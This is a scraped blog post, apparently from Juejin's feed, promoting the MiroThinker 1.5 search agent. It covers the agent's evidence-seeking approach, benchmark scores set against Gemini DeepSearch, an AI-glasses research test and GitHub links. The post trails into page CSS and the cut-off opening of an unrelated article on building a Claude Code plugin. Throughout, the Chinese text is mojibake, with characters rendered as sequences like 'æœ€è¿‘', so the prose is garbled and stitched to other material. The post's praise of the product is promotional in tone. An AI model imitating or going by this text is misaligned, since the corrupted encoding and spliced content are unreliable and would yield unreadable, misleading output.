<p>æœ€è¿‘ï¼ŒMiroMind å›¢é˜Ÿå¼€æºçš„ <strong>MiroThinker 1.5</strong> å¼•èµ·äº†æˆ‘çš„æ³¨æ„ã€‚å®ƒä¸æ‹¼ä¸‡äº¿å‚æ•°ï¼Œè€Œæ˜¯èµ°äº†ä¸€æ¡åå…±è¯†çš„ <strong>â€œå‘ç°å¼æ™ºèƒ½â€</strong> ï¼ˆDiscovery Intelligenceï¼‰è·¯çº¿ ã€‚</p>
<p>åœ¨ä½¿ç”¨äº†ä¸€å‘¨å¹¶æ·±åº¦æ‹†è§£äº†å…¶ GitHub ä»£ç åï¼Œæˆ‘å†³å®šèŠèŠä¸ºä»€ä¹ˆæˆ‘è®¤ä¸ºå®ƒå¯èƒ½æ˜¯ç›®å‰æœ€æ¥è¿‘â€œçœŸç›¸â€çš„æœç´¢æ™ºèƒ½ä½“ã€‚</p>
<p><strong>ã€ç¬¬ä¸€æ—¶é—´ä½“éªŒä¼ é€é—¨ã€‘ğŸ‘‰</strong> <strong>ç«‹å³å…è´¹ä½¿ç”¨ <a href="https://link.juejin.cn?target=MiroThinker" title="MiroThinker" target="_blank" ref="nofollow noopener noreferrer">MiroThinker (dr.miromind.ai)</a></strong></p>
<h2 data-id="heading-2">ä¸€ã€ æ ¸å¿ƒå·®å¼‚ï¼šâ€œåšé¢˜å®¶â€ vs â€œç§‘å­¦å®¶â€</h2>
<p>å¤§å¤šæ•°ä¸»æµå¤§æ¨¡å‹æ˜¯å…¸å‹çš„ <strong>â€œåšé¢˜å®¶â€</strong> ã€‚å®ƒä»¬è¯•å›¾æŠŠå…¨äººç±»çš„çŸ¥è¯†èƒŒè¿›å‚æ•°é‡Œï¼ˆInternal Parametersï¼‰ï¼Œé‡åˆ°é—®é¢˜æ—¶ï¼ŒåŸºäºæ¦‚ç‡åˆ†å¸ƒâ€œç¼–â€ä¸€ä¸ªç­”æ¡ˆ ã€‚è¿™å°±å¯¼è‡´äº†ä¸¥é‡çš„å¹»è§‰â€”â€”ä¸æ‡‚è£…æ‡‚ã€‚</p>
<p>è€Œ MiroThinker 1.5 çš„æ ¸å¿ƒç†å¿µæ˜¯ <strong>â€œç§‘å­¦å®¶æ¨¡å¼â€</strong> ã€‚å®ƒä¸ä¾èµ–æ­»è®°ç¡¬èƒŒï¼Œè€Œæ˜¯ä¾èµ– <strong>Interactive Scalingï¼ˆäº¤äº’å¼æ‰©å±•ï¼‰</strong> ã€‚å½“å®ƒé‡åˆ°ä¸ç¡®å®šçš„é—®é¢˜æ—¶ï¼Œå®ƒä¼šæ‰§è¡Œä¸€ä¸ªæ…¢æ€è€ƒé—­ç¯ï¼š</p>
<ol>
<li><strong>æå‡ºå‡è®¾</strong>ï¼šé’ˆå¯¹é—®é¢˜æ„å»ºåˆæ­¥çš„é€»è¾‘æ¨¡å‹ã€‚</li>
<li><strong>ä¸»åŠ¨å‘å¤–éƒ¨ä¸–ç•ŒæŸ¥è¯ï¼ˆEvidence-Seekingï¼‰</strong> ï¼šè°ƒç”¨æœç´¢å·¥å…·è·å–å®æ—¶ä¿¡æ¯ ã€‚</li>
<li><strong>å‘ç°å¯¹ä¸ä¸Šï¼Œè‡ªæˆ‘å¦å®š</strong>ï¼šæ¯”å¯¹å‡è®¾ä¸è¯æ®ï¼Œè¯†åˆ«çŸ›ç›¾ç‚¹ã€‚</li>
<li><strong>ä¿®æ­£å‡è®¾ï¼Œç›´åˆ°è¯æ®****æ”¶æ•›</strong>ï¼šé€šè¿‡å¤šè½®è¿­ä»£ï¼Œç¡®ä¿ç»“è®ºå‡†ç¡®å¯é  ã€‚</li>
</ol>
<p>è¿™ç§æœºåˆ¶è®©å®ƒåœ¨å¤„ç†å¤æ‚é—®é¢˜æ—¶ï¼Œè¡¨ç°å‡ºäº†æƒŠäººçš„é€»è¾‘å¯†åº¦ã€‚</p>
<h3 data-id="heading-3">äºŒã€ ç¡¬æ ¸å®æµ‹ï¼šä»¥å°åšå¤§çš„â€œè¶Šçº§æŒ‘æˆ˜â€</h3>
<p>å£è¯´æ— å‡­ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹ Benchmark æ•°æ®ã€‚</p>
<p>åœ¨æœç´¢æ™ºèƒ½ä½“æœ€çœ‹é‡çš„ <strong>BrowseComp</strong> è¯„æµ‹é›†ä¸­ï¼ŒMiroThinker 1.5 å±•ç°äº†æé«˜çš„â€œæ™ºæ•ˆæ¯”â€ã€‚ç‰¹åˆ«æ˜¯ <strong>MiroThinker-v1.5-30B</strong> ç‰ˆæœ¬ï¼Œä»¥æå°çš„å‚æ•°è§„æ¨¡ï¼Œè·‘å‡ºäº†ä»¤äººå’‹èˆŒçš„æˆç»©ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb41274dd7154f849b0ae36b4ff7d6e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=kFuaTBfSbRPL%2BGKiJ6AaslFOsxE%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€ç»„å…³é”®æ•°æ®å¯¹æ¯”ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9d18b8c117f4c16b61268c6a0298d11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=01yPkV%2FHx4ipQ6cOcHcehVg4oWY%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Gemini DeepSearch</strong>ï¼šå¾—åˆ† <strong>59.2</strong></li>
<li><strong>MiroThinker-v1.5-30B</strong>ï¼šå¾—åˆ† <strong>56.1</strong></li>
</ul>
<p><strong>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</strong> ä¸€ä¸ªä»…æœ‰ 30B å‚æ•°çš„å¼€æºæƒé‡æ¨¡å‹ï¼Œåœ¨æœç´¢ä¸æ¨ç†çš„ç»¼åˆèƒ½åŠ›ä¸Šï¼Œ<strong>å‡ ä¹å¿«è¦è¿½å¹³äº†</strong> Google é¡¶çº§çš„é—­æºæœç´¢æ¨¡å‹ Gemini DeepSearchã€‚</p>
<p>è¿™è¯æ˜äº† MiroMind å›¢é˜Ÿçš„è§‚ç‚¹ï¼šæ™ºèƒ½çš„æå‡ä¸ä¸€å®šéè¦é å †ç Œä¸‡äº¿å‚æ•°ï¼ˆScaling Lawï¼‰ï¼Œé€šè¿‡é«˜æ•ˆçš„ <strong>Interactive Scalingï¼ˆäº¤äº’å¼æ‰©å±•ï¼‰</strong> ï¼Œå°æ¨¡å‹ä¹Ÿèƒ½æ‹¥æœ‰é¡¶çº§çš„â€œæŸ¥è¯â€ä¸â€œæ€è€ƒâ€èƒ½åŠ›ã€‚å¯¹äºå¼€å‘è€…å’Œä¸ªäººç”¨æˆ·æ¥è¯´ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æˆ–ä½æˆæœ¬ç¯å¢ƒä¸‹ï¼Œè·å¾—ä¸€çº¿å¤§å‚çº§åˆ«çš„æœç´¢æ¨ç†ä½“éªŒã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€ çœŸå®ä½“éªŒï¼šä¸€ä»½å…³äºâ€œAIçœ¼é•œâ€çš„æ·±åº¦è°ƒç ”</h2>
<p>ä¸ºäº†éªŒè¯å®ƒæ˜¯å¦çœŸçš„å…·å¤‡â€œæ·±åº¦æ€è€ƒâ€èƒ½åŠ›ï¼Œæˆ‘å¹¶æ²¡æœ‰ç”¨ç®€å•çš„ç™¾ç§‘é—®é¢˜æµ‹è¯•å®ƒï¼Œè€Œæ˜¯æ¨¡æ‹Ÿäº†ä¸€ä¸ªæŠ•èµ„äºº/äº§å“ç»ç†çš„çœŸå®åœºæ™¯ã€‚</p>
<p>æˆ‘åœ¨ Web ç«¯è¾“å…¥äº†è¿™æ ·ä¸€ä¸ªæŒ‡ä»¤ï¼š</p>
<blockquote>
<p><strong>â€œç»™æˆ‘è°ƒç ”ä¸€ä¸‹ AIçœ¼é•œï¼Œç»™æˆ‘å‡ºä¸€ä»½æ·±åº¦æŠ¥å‘Šâ€</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c876e5bbe224aa78825ae12eb984576~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=NhenJWw55R%2BIeFlNULWwL51ejkA%3D" alt="" loading="lazy"/></p>
<p><strong>å®ƒçš„ååº”è®©æˆ‘æ„Ÿåˆ°æƒŠå–œï¼Œå…·ä½“è¡¨ç°å¦‚ä¸‹ï¼š</strong></p>
<ul>
<li><strong>æ‹†è§£ä¸è§„åˆ’</strong>å®ƒæ²¡æœ‰ç«‹å³ç”Ÿæˆæ–‡æœ¬ï¼Œè€Œæ˜¯å…ˆå±•ç¤ºäº†å®ƒçš„æ€è€ƒè·¯å¾„ï¼ˆThinking Processï¼‰ã€‚å®ƒå°†ä»»åŠ¡æ‹†è§£ä¸ºâ€œå¸‚åœºè§„æ¨¡â€ã€â€œæ ¸å¿ƒç©å®¶ï¼ˆMeta/Ray-Ban, Apple, å›½å†…å‚å•†ï¼‰â€ã€â€œæŠ€æœ¯ç“¶é¢ˆâ€ã€â€œæœªæ¥è¶‹åŠ¿â€ç­‰å­ä»»åŠ¡ ã€‚</li>
<li><strong>å¤šæºéªŒè¯</strong>æˆ‘çœ‹åˆ°åå°ä¸æ–­é—ªçƒç€ <code>Tool Calls</code>ã€‚å®ƒåœ¨è°ƒç”¨ Google Search æ£€ç´¢æœ€æ–°çš„å‘å¸ƒä¼šä¿¡æ¯ï¼ŒåŒæ—¶æŠ“å–æ·±åº¦çš„è¡Œä¸šåˆ†ææ–‡ç«  [9]ã€‚</li>
<li><strong>å»ä¼ªå­˜çœŸ</strong>æœ€å…³é”®çš„æ˜¯ï¼Œå®ƒè¿‡æ»¤æ‰äº†å¤§é‡çš„è¥é”€å·è½¯æ–‡ï¼Œé€šè¿‡æ¯”å¯¹ä¸åŒä¿¡æºçš„æ•°æ®ï¼Œç»™å‡ºäº†ä¸€ä»½ç»“æ„æå…¶ä¸¥è°¨çš„æŠ¥å‘Šã€‚</li>
</ul>
<p><em>( Search -&gt; Thinking -&gt; Refining ä½“ç°å…¶ Evidence-Seeking çš„èƒ½åŠ›)</em></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/090d70e741324dc4a734bb8d23f68d66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=q9u5%2BzVD9vqwXoylofZTxfe0Vgs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/430505f6427946a1a80f2b3e338b3246~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=IuB%2F%2BVDVqarCCHCSZ15D7vZFn%2FU%3D" alt="" loading="lazy"/></p>
<p><em>æœç´¢çš„æ•°æ®æœç´¢å¥½äº†ä¹‹åï¼Œç»™å‡ºäº†ä¸€ä»½è¯¦ç»†çš„ç ”ç©¶æŠ¥å‘Š</em></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1707c4642318438981b2e96d3340f6f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=GnaUNBybYpftnyGyp9QkuJo5kkI%3D" alt="" loading="lazy"/></p>
<p><em>ç‰¹åˆ«æ˜¯è¿˜ä¼šæŠŠæ¯ä¸ªåœ°æ–¹çš„ä¿¡æ¯æºå¼•ç”¨çš„åœ°æ–¹éƒ½åšå¥½äº†æ ‡æ³¨ï¼Œç„¶ååœ¨æœ€åç»™å‡ºå¼•ç”¨æºçš„é“¾æ¥ï¼Œè®©ä½ çš„æ•°æ®æœ‰æ®å¯æŸ¥</em></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6ed3a6ac75d466da9f9927e07b4b863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=9GjW6dzZKzpPLrpTUwDX%2B1emA94%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19ef52c1af6f49c7817a96e608c22a3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=TgS8581kNHVhpf9zgQg7WuUP8dQ%3D" alt="" loading="lazy"/></p>
<p>æœ€ç»ˆç”Ÿæˆçš„æŠ¥å‘Šä¸ä»…åŒ…å«äº† å„ä¸ªå‚å•†çš„æƒ…å†µå’Œç ”ç©¶æ–¹å‘ï¼Œè¿˜æ·±å…¥åˆ†æäº†å›½å†…å‚å•†åœ¨å…‰æ³¢å¯¼æŠ€æœ¯ä¸Šçš„å¸ƒå±€å·®å¼‚ã€‚è¿™ç§â€œç ”ç©¶å‘˜â€çº§åˆ«çš„äº¤ä»˜èƒ½åŠ›ï¼Œæ­£æ˜¯è§£å†³â€œä¿¡æ¯é›¾éœ¾â€çš„è§£è¯ã€‚</p>
<h2 data-id="heading-5">å››ã€ æŠ€æœ¯è§£å¯†ï¼šGitHub ç”Ÿæ€ä¸å¼€æºç²¾ç¥</h2>
<p>å¯¹äºæŠ€æœ¯çˆ±å¥½è€…æ¥è¯´ï¼ŒMiroThinker 1.5 æœ€æ€§æ„Ÿçš„åœ°æ–¹åœ¨äºå®ƒçš„å¼€æºç”Ÿæ€ã€‚MiroMind å›¢é˜Ÿå¹¶æ²¡æœ‰æŠŠæŠ€æœ¯è—ç€æ–ç€ï¼Œè€Œæ˜¯åœ¨ GitHub ä¸Šå¼€æºäº†æ ¸å¿ƒä»£ç å’Œæ¡†æ¶ ã€‚</p>
<p><strong>å¼€å‘è€…èµ„æºæŒ‡è·¯ï¼š</strong></p>
<ul>
<li><strong>GitHub</strong> <strong>é¡¹ç›®ä¸»é¡µï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMiroMindAI%2FMiroThinker" target="_blank" title="https://github.com/MiroMindAI/MiroThinker" ref="nofollow noopener noreferrer">github.com/MiroMindAI/â€¦</a> <em>(å¼ºçƒˆå»ºè®®å»ç‚¹ä¸ª Star â­ï¼Œæ”¯æŒå¼€æºç²¾ç¥)</em></li>
<li><strong>MiroFlow</strong> <strong>å¼€æºæ¡†æ¶</strong> <strong>ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMiroMindAI%2FMiroFlow" target="_blank" title="https://github.com/MiroMindAI/MiroFlow" ref="nofollow noopener noreferrer">github.com/MiroMindAI/â€¦</a></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6371b1e000164ce79145db48464ffbcb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=ksF4xOJJhE82t7k9C8cfe2MaWAo%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬åœ¨ GitHub çš„æ–‡æ¡£ä¸­å¯ä»¥çœ‹åˆ°å‡ ä¸ªå…³é”®çš„æŠ€æœ¯çªç ´ï¼š</p>
<ol>
<li><strong>400æ¬¡å·¥å…·è°ƒç”¨ï¼ˆTool Callsï¼‰</strong> ï¼šå®ƒæ”¯æŒåœ¨å•æ¬¡ä»»åŠ¡ä¸­è¿›è¡Œé«˜è¾¾ 400 æ¬¡çš„å·¥å…·äº¤äº’ï¼Œè¿™è¿œè¶…ä¸€èˆ¬ Agent çš„é™åˆ¶ï¼Œä½¿å…¶èƒ½å¤„ç†æé•¿å‘¨æœŸçš„å¤æ‚ä»»åŠ¡ [12]ã€‚</li>
<li><strong>æ—¶åºæ•æ„Ÿè®­ç»ƒæ²™ç›’</strong>ï¼šè¿™æ˜¯å¾ˆå¤šæ¨¡å‹å¿½ç•¥çš„ç‚¹ã€‚MiroThinker åœ¨è®­ç»ƒæ—¶å¼ºè¡Œçº¦æŸæ¨¡å‹â€œåªèƒ½çœ‹è¿‡å»ï¼Œä¸èƒ½çœ‹æœªæ¥â€ï¼Œå½»åº•æœç»äº†æ•°æ®æ³„éœ²ï¼ˆFuture Leakageï¼‰ï¼Œç¡®ä¿äº†é¢„æµ‹çš„çœŸå®æ€§ ã€‚</li>
<li><strong>256K è¶…é•¿ä¸Šä¸‹æ–‡</strong>ï¼šæ”¯æŒæµ·é‡èµ„æ–™çš„ååä¸åˆ†æ ã€‚</li>
</ol>
<p>å¦‚æœä½ æ˜¯å¼€å‘è€…ï¼Œä½ å¯ä»¥ç›´æ¥ <code>Fork</code> ä»£ç ï¼Œåœ¨æœ¬åœ°éƒ¨ç½²ï¼ˆæ”¯æŒ SGLang æˆ– vLLMï¼‰ï¼Œç”šè‡³åˆ©ç”¨å®ƒçš„ MCP åè®®æ‰©å±•è‡ªå·±çš„å·¥å…·é›† ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce4a84da8633447da6832ef10f2edf26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=e2CV2Eluk4Bz0bsA%2B13cr%2BxGpwY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">äº”ã€ æ€»ç»“</h2>
<p>MiroThinker 1.5 ä¸æ˜¯å¦ä¸€ä¸ªâ€œèŠå¤©ç©å…·â€ï¼Œå®ƒæ˜¯ä¸ºé‚£äº›æ¸´æœ›<strong>çœŸç›¸ã€æ·±åº¦å’Œæ•ˆç‡</strong>çš„äººå‡†å¤‡çš„ <strong>â€œå¤–è„‘â€</strong> ã€‚å®ƒè¯æ˜äº†é€šè¿‡ Interactive Scalingï¼ŒAI å¯ä»¥ä»â€œå¤è¯»æœºâ€è¿›åŒ–ä¸ºâ€œç§‘å­¦å®¶â€ã€‚</p>
<p>æ— è®ºä½ æ˜¯è¢«ä¿¡æ¯è¿‡è½½å›°æ‰°çš„å†³ç­–è€…ï¼Œè¿˜æ˜¯é€šè¿‡å¼€æºä»£ç æ¢ç´¢ä¸–ç•Œçš„å¼€å‘è€…ï¼Œæˆ‘éƒ½å¼ºçƒˆæ¨èä½ è¯•ä¸€è¯•ï¼š</p>
<ol>
<li><strong>æ™®é€šç”¨æˆ·/å†³ç­–è€…</strong>ï¼šç›´æ¥ä½¿ç”¨ Web ç«¯ï¼Œä½“éªŒâ€œé¡¶çº§ç ”ç©¶å‘˜â€å¸®ä½ æŸ¥èµ„æ–™çš„å¿«æ„Ÿã€‚ğŸ‘‰ <strong>ç‚¹å‡»æ³¨å†Œä½“éªŒ (dr.miromind.ai)</strong></li>
<li><strong>ç ”ç©¶å‘˜/æå®¢</strong>ï¼šå» Hugging Face ä¸‹è½½æ¨¡å‹ï¼Œåœ¨æœ¬åœ°è·‘èµ·æ¥ã€‚ğŸ‘‰ <strong>æ¨¡å‹ä¸‹è½½ (Hugging Face)</strong></li>
<li><strong>å¼€å‘è€…</strong>ï¼šè®¿é—® GitHub é¡¹ç›®ï¼ŒFork ä»£ç ï¼Œå…±å»ºç”Ÿæ€ã€‚ğŸ‘‰ <strong>GitHub é¡¹ç›®ä¸»é¡µ (ç»™ä¸ªStaræ”¯æŒ)</strong></li>
</ol>
<p><strong>åœ¨è¿™ä¸ªå……æ»¡å™ªå£°çš„ä¸–ç•Œé‡Œï¼Œè®©æˆ‘ä»¬ä¸€èµ·ç”¨ AI é€¼è¿‘çœŸç›¸ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶å¼€å§‹åˆ›å»ºä¸€ä¸ªå±äºè‡ªå·±çš„ Claude Code Plugin]]></title>    <link>https://juejin.cn/post/7594627998839046186</link>    <guid>https://juejin.cn/post/7594627998839046186</guid>    <pubDate>2026-01-13T03:00:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594627998839046186" data-draft-id="7594351060614053907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶å¼€å§‹åˆ›å»ºä¸€ä¸ªå±äºè‡ªå·±çš„ Claude Code Plugin"/> <meta itemprop="keywords" content="Claude"/> <meta itemprop="datePublished" content="2026-01-13T03:00:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="flutter"/> <meta itemprop="url" content="https://juejin.cn/user/3456520288478398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶å¼€å§‹åˆ›å»ºä¸€ä¸ªå±äºè‡ªå·±çš„ Claude Code Plugin
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3456520288478398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    flutter
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:00:35.000Z" title="Tue Jan 13 2026 03:00:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/392d7700c017408da42e9e5b3309e1c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmx1dHRlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878035&amp;x-signature=aLk3SSanLlpLjKtp%2F2mbnDnCBcA%3D" alt="claude-code-plugin-cover.png" loading="lazy"/></p>
<blockquote>
<p>æ–‡ç« åŒæ­¥å‘å¸ƒäºæˆ‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.xiaban.run%2F" target="_blank" title="https://blog.xiaban.run/" ref="nofollow noopener noreferrer">ä¸ªäººåšå®¢</a></p>
</blockquote>
<blockquote>
<p>[!TIP]
